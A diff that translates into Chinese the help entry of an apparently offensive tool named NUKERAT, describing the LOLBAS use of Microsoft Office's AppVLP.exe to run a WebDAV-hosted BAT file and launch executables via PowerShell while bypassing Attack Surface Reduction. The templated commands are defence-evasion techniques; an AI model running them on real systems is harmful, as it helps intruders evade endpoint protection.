@@ -1,20 +1,20 @@
-ABOUT
+关于
     Application Virtualization Utility Included with Microsoft Office
     2016. LOLBAS covers execution of BAT file hosted on Webdav server
     and local execution of process bypassing Attack Surface Reduction
     (ASR).
 
-USAGE:
+用法：
     AppVLP.exe {PATH_SMB:.bat}
     AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
 
-EXAMPLES:
+示例：
     AppVLP.exe {PATH_SMB:.bat}
     AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     AppVLP.exe {PATH_SMB:.bat}
